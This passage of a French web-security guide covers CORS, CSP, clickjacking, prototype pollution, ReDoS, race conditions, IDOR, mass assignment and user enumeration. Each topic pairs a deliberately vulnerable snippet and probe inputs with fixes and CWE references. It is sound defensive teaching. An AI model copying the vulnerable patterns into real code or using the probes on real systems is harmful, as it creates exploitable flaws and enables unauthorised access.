Cache-Control: private, no-store   # pour toute réponse spécifique à un utilisateur
```

**Détection :** identifier les en-têtes non-keyed qui altèrent la réponse (Param Miner) ; pour la deception, tester des suffixes `/;.css`, `/foo.js` sur des pages authentifiées.

**Remédiation :** normaliser et restreindre les entrées reflétées, `Cache-Control: private/no-store` sur le contenu sensible, cache uniquement sur des ressources statiques, faire correspondre la mise en cache au vrai `Content-Type` et non à l'extension d'URL. CWE-524.
---SECTION---
HEADING: CORS mal configuré
BODY:
Le Same-Origin Policy isole les origines ; CORS l'assouplit de façon *contrôlée* via des en-têtes de réponse. Une configuration laxiste permet à un site attaquant de lire des réponses authentifiées de la victime, exfiltrant données personnelles ou jetons.

La faute la plus grave est de **refléter l'`Origin`** de la requête tout en autorisant les credentials :
```python
resp.headers["Access-Control-Allow-Origin"] = request.headers["Origin"]  # dangereux
resp.headers["Access-Control-Allow-Credentials"] = "true"
```
Autres pièges : accepter l'origine **`null`** (atteignable depuis un iframe sandboxé — facile à forger), et des **regex de validation trop permissives** : `^https://.*\.example\.com$` matche `evil.example.com.attacker.com`, un point non échappé, ou un suffixe oublié (`example.com.evil.com`).

Correction : liste blanche **exacte** d'origines, jamais de reflet aveugle, refuser `null`, et ne renvoyer `Allow-Credentials: true` que pour des origines strictement approuvées.
```python
ALLOWED = {"https://app.example.com"}
origin = request.headers.get("Origin")
if origin in ALLOWED:
    resp.headers["Access-Control-Allow-Origin"] = origin
    resp.headers["Access-Control-Allow-Credentials"] = "true"
```

**Détection :** envoyer différents `Origin` (dont `null`, sous-domaines, suffixes) et observer les en-têtes reflétés.

**Remédiation :** correspondance exacte en liste blanche, jamais de reflet ni de wildcard avec credentials, refuser `null`, valider les regex avec ancrage et échappement corrects. CWE-942 (et CWE-346).
---SECTION---
HEADING: Content Security Policy (CSP) et ses contournements
BODY:
La CSP est une défense en profondeur contre le XSS : elle déclare via un en-tête les sources autorisées pour scripts, styles, images, etc. Bien conçue, elle empêche l'exécution d'un script injecté même si une faille XSS existe. Mal conçue, elle offre un faux sentiment de sécurité.

Politique faible et contournements typiques : `'unsafe-inline'` (autorise tout script inline → annule la protection XSS), `'unsafe-eval'`, des domaines trop larges hébergeant des **gadgets JSONP** ou des bibliothèques permissives, ou un wildcard `*`.

Politique robuste basée sur des **nonces** (ou hashes) et `strict-dynamic` :
```
Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic';
  object-src 'none'; base-uri 'none'; require-trusted-types-for 'script'
```
```html
<script nonce="r4nd0m">/* seul ce script s'exécute */</script>
```
`object-src 'none'` bloque les plugins ; `base-uri 'none'` empêche le détournement des URL relatives via `<base>` ; `Trusted Types` neutralise les sinks DOM XSS.

**Détection :** analyser la politique (CSP Evaluator de Google), repérer `unsafe-inline`/`unsafe-eval`, wildcards, domaines à gadgets.

**Remédiation :** CSP à nonces/hashes + `strict-dynamic`, `object-src 'none'`, `base-uri 'none'`, éviter `unsafe-inline`/`unsafe-eval`, Trusted Types, déployer d'abord en `Report-Only`. La CSP complète mais ne remplace pas l'encodage de sortie. CWE-1021 / défense contre CWE-79.
---SECTION---
HEADING: Clickjacking
BODY:
Le clickjacking (UI redress) superpose, dans un iframe invisible, une page cible au-dessus (ou en dessous) d'un leurre. La victime croit cliquer sur le leurre mais interagit en réalité avec l'application ciblée, où elle est authentifiée — déclenchant une action sensible.

Attaque type : l'application victime est chargée dans un iframe rendu transparent, positionné pour que son bouton « Confirmer » coïncide avec un bouton « Gagner un prix » du site attaquant.

Correction : interdire le cadrage de l'application par des origines tierces, via la CSP `frame-ancestors` (moderne et prioritaire) et, pour les vieux navigateurs, `X-Frame-Options`.
```
Content-Security-Policy: frame-ancestors 'self'
X-Frame-Options: DENY
```

En complément, les actions sensibles peuvent exiger une **ré-authentification** et les cookies de session devraient être `SameSite`.

**Détection :** tenter de charger la page dans un iframe ; vérifier l'absence de `frame-ancestors`/`X-Frame-Options` sur les pages sensibles.

**Remédiation :** `frame-ancestors 'self'` (ou liste blanche), `X-Frame-Options: DENY/SAMEORIGIN` en repli, confirmation forte pour les actions critiques. CWE-1021.
---SECTION---
HEADING: Prototype pollution (client et serveur)
BODY:
Spécifique à JavaScript, la prototype pollution consiste à écrire des propriétés sur `Object.prototype` via des clés spéciales (`__proto__`, `constructor`, `prototype`). Comme presque tous les objets héritent de ce prototype, la propriété injectée « apparaît » partout, ce qui permet de manipuler la logique de l'application.

Code vulnérable (merge récursif naïf) :
```js
function merge(t, s){ for (const k in s){
  if (typeof s[k]==='object') merge(t[k]=t[k]||{}, s[k]); else t[k]=s[k]; } }
merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
({}).isAdmin // → true : tout objet hérite désormais de isAdmin
```

Côté **client**, la pollution alimente souvent un DOM XSS. Côté **serveur** (Node.js), elle peut mener à un contournement d'autorisation (injecter `isAdmin`), à une altération de configuration, voire à une **RCE** en polluant des options passées à `child_process`.

Correction : bloquer les clés dangereuses, figer le prototype, et utiliser des structures sans prototype.
```js
if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;
// ou : const store = Object.create(null);   Object.freeze(Object.prototype);
// ou : new Map()  au lieu d'un objet indexé par des clés utilisateur
```

**Détection :** injecter `__proto__[x]`, `constructor.prototype.x` dans JSON/query strings ; vérifier si une propriété globale apparaît.

**Remédiation :** rejeter/filtrer `__proto__`/`constructor`/`prototype`, `Object.create(null)` ou `Map`, `Object.freeze(Object.prototype)`, validation de schéma. CWE-1321.
---SECTION---
HEADING: ReDoS (Regular Expression Denial of Service)
BODY:
Certaines expressions régulières ont une complexité **exponentielle** sur des entrées adverses, à cause du *backtracking catastrophique* des moteurs regex traditionnels. Une courte chaîne peut bloquer un cœur CPU pendant des secondes, provoquant un déni de service (surtout en environnement mono-thread comme Node.js).

Motifs à risque : quantificateurs imbriqués ou ambigus, comme `(a+)+`, `(a|a)*`, `(.*)*`, `(\d+)*$`.
```js
const re = /^(a+)+$/;
re.test("a".repeat(40) + "!");   // temps ~exponentiel → DoS
```
Des regex de validation d'email/URL trop « intelligentes » sont des sources fréquentes.

Correction : réécrire le motif sans ambiguïté ni imbrication, ancrer, borner les répétitions.
```js
const re = /^a+$/;                       // linéaire
// ou limiter : /^a{1,64}$/  ;  valider la longueur d'entrée en amont
```
Alternativement, un moteur regex **sans backtracking** (RE2) garantit un temps linéaire, ou exécuter avec un timeout.

**Détection :** analyse statique (safe-regex, redos-detector, CodeQL), fuzzing de longueur.

**Remédiation :** motifs linéaires, bornes sur les quantificateurs, validation de longueur préalable, moteur RE2 pour les patterns sur données non fiables, timeout. CWE-1333 (et CWE-400).
---SECTION---
HEADING: Race conditions et TOCTOU
BODY:
Une race condition survient quand le résultat dépend de l'ordre d'exécution concurrent de plusieurs requêtes. Le cas TOCTOU (*Time-Of-Check to Time-Of-Use*) exploite l'écart entre le moment où une condition est vérifiée et celui où elle est utilisée : deux requêtes simultanées passent toutes deux le *check* avant que l'une n'ait appliqué son *use*.

Exemples : réutilisation d'un **code promo** à usage unique en l'envoyant N fois en parallèle ; **dépassement de solde** ; contournement de limites. Code vulnérable :
```python
if coupon.uses_left > 0:      # vérification
    apply_discount(order)     # ... fenêtre de course ...
    coupon.uses_left -= 1     # utilisation, trop tard
```
Envoyée 20 fois simultanément (« single-packet attack »), la condition est vraie 20 fois avant la première décrémentation.

Correction : rendre l'opération **atomique** au niveau de la base.
```sql
UPDATE coupons SET uses_left = uses_left - 1
WHERE id = :id AND uses_left > 0;   -- réussit exactement une fois
```
On peut aussi utiliser des verrous pessimistes (`SELECT ... FOR UPDATE`), des verrous distribués (Redis) ou une contrainte d'unicité.

**Détection :** envoyer des lots de requêtes simultanées (Turbo Intruder / single-packet attack) et observer des effets multiples.

**Remédiation :** opérations atomiques, contraintes d'unicité, transactions/isolation adéquates, idempotence via clé unique, verrous applicatifs. CWE-362 (et CWE-367 pour TOCTOU).
---SECTION---
HEADING: IDOR, BOLA et BFLA
BODY:
L'**IDOR** (Insecure Direct Object Reference) est un cas de contrôle d'accès cassé où une référence à un objet (ID en URL/paramètre) n'est pas accompagnée d'une vérification que l'utilisateur *a le droit* d'y accéder. Dans le vocabulaire API (OWASP API Top 10), on parle de **BOLA** (Broken Object Level Authorization) pour les objets, et de **BFLA** (Broken Function Level Authorization) pour les *fonctions/actions* (ex. un utilisateur standard appelant un endpoint d'admin).

Code vulnérable :
```python
@app.get("/invoice/<id>")
def invoice(id):
    return db.invoices.find(id)   # aucune vérif que la facture appartient à l'user
# /invoice/1001 → /invoice/1002 : je lis la facture d'un autre client
```

Correction : vérifier l'autorisation **côté serveur, à chaque requête**, en liant l'objet à l'utilisateur courant.
```python
inv = db.invoices.find(id)
if inv is None or inv.owner_id != current_user.id:   # object-level check
    abort(404)
# pour les fonctions admin : if not current_user.is_admin: abort(403)
```

Utiliser des identifiants non devinables (UUID) est une défense en profondeur *utile mais non suffisante* : le vrai correctif est le contrôle d'accès serveur.

**Détection :** incrémenter/substituer des ID, rejouer des requêtes avec un autre compte, appeler des endpoints privilégiés avec un compte faible.

**Remédiation :** contrôle d'accès centralisé et systématique côté serveur (objet + fonction), refuser par défaut, tests d'autorisation multi-comptes. CWE-639, CWE-284/CWE-285.
---SECTION---
HEADING: Mass assignment
BODY:
Le mass assignment (ou *autobinding*) se produit quand un framework lie automatiquement les champs d'une requête aux attributs d'un objet du modèle. Si la liaison n'est pas restreinte, l'attaquant ajoute des champs non prévus (`isAdmin`, `role`, `balance`) et modifie des attributs sensibles.

Code vulnérable :
```js
// PATCH /users/me   body: {"name":"Bob","isAdmin":true}
Object.assign(user, req.body);   // isAdmin passe à true
await user.save();
```

Correction : n'accepter qu'une **liste blanche** de champs modifiables (allowlist / DTO explicite), jamais l'objet de requête entier.
```js
const { name, bio } = req.body;         // seuls les champs autorisés
await User.update({ name, bio }, { where: { id: req.user.id } });
```

**Détection :** ajouter aux corps JSON des champs sensibles devinés (`role`, `isAdmin`) et vérifier s'ils sont pris en compte.

**Remédiation :** binding par liste blanche / DTO, marquer les champs sensibles non assignables, séparer modèles d'API et de persistance, validation de schéma. CWE-915.
---SECTION---
HEADING: Exposition excessive de données
BODY:
Distincte du contrôle d'accès, cette faille (OWASP API3) consiste à renvoyer **plus de données que nécessaire**, en s'en remettant au client pour filtrer. L'API sérialise l'objet entier (souvent le modèle de base) et laisse fuiter des champs sensibles : hash de mot de passe, tokens, PII.

Code vulnérable :
```js
res.json(user);   // sérialise TOUT : password_hash, reset_token, is_internal...
```
Même si l'UI n'affiche que le nom, la réponse HTTP brute contient tout. Un problème jumeau est la fuite d'informations par les **messages d'erreur** (stack traces, versions) et les métadonnées (sourcemaps exposés).

Correction : construire explicitement la **représentation de sortie** (DTO/serializer avec liste blanche de champs).
```js
res.json({ id: user.id, name: user.name, avatar: user.avatar });
```

**Détection :** inspecter les réponses brutes (pas seulement l'UI) ; tester GraphQL (introspection, sur-récupération) ; provoquer des erreurs.

**Remédiation :** DTO/serializers à liste blanche, ne jamais renvoyer les entités de persistance, désactiver les stack traces en production, retirer sourcemaps/en-têtes révélateurs. CWE-213 (et CWE-200).
---SECTION---
HEADING: Contrôle d'accès cassé (vue d'ensemble)
BODY:
Le contrôle d'accès cassé est la catégorie n°1 de l'OWASP Top 10 2021 et englobe plusieurs failles (IDOR/BOLA, BFLA, mass assignment, force browsing). L'idée centrale : l'application n'applique pas correctement *ce qu'un utilisateur a le droit de faire*.

Symptômes fréquents : accès à des pages d'admin par URL directe (**force browsing** : `/admin` accessible sans être admin), **élévation verticale** (devenir admin), **horizontale** (accéder aux données d'un pair), paramètres de rôle manipulables (`?role=admin`), API non protégées supposées « cachées ».

Bonne architecture : un point de décision d'autorisation **centralisé**, appliqué côté serveur, en **deny-by-default**, réévalué à chaque requête sur la base de l'identité de session (jamais d'un paramètre client).
```python
@require_permission("invoice:read")
def get_invoice(id):
    inv = repo.get(id)
    enforce(current_user.can_access(inv))   # object-level + function-level
    return inv
```

**Détection :** matrice de tests d'autorisation multi-rôles/comptes, exploration d'endpoints non liés dans l'UI, manipulation de rôles et d'ID, replay inter-utilisateurs.

**Remédiation :** modèle d'autorisation centralisé (RBAC/ABAC), refus par défaut, contrôles serveur systématiques (objet + fonction), pas de sécurité par l'obscurité, journalisation des refus, tests automatisés. CWE-284 (et CWE-862, CWE-863).
---SECTION---
HEADING: Énumération d'utilisateurs
BODY:
L'énumération d'utilisateurs permet de déterminer si un identifiant (email, nom d'utilisateur) existe, à partir de différences observables. Ce n'est pas une compromission directe, mais un **amplificateur** : elle prépare le credential stuffing, le password spraying et le phishing ciblé.

Sources de fuite : messages d'erreur distincts (« utilisateur inconnu » vs « mot de passe incorrect ») au **login**, à l'**inscription** (« email déjà utilisé ») et au **reset** ; différences de **temps de réponse** (le hachage n'est calculé que si l'utilisateur existe → réponse plus lente pour un compte valide) ; codes HTTP ou redirections différents.

Correction : rendre les réponses **indistinctes** entre compte existant et inexistant, et niveler le temps de traitement.
```python
if not user or not verify(password, user.hash):   # toujours calculer un hash
    return "Identifiants invalides", 401
send_reset_if_exists(email)
return "Si un compte existe, un email a été envoyé", 200
```
Pour le timing, effectuer un calcul de hachage factice quand l'utilisateur n'existe pas. Combiner avec **rate limiting** et CAPTCHA.

**Détection :** comparer messages, codes, temps de réponse entre identifiants valides et invalides.

**Remédiation :** messages et statuts génériques et constants, temps de réponse égalisé, rate limiting, CAPTCHA, MFA pour réduire l'impact du credential stuffing. CWE-204 / CWE-203.
===END===
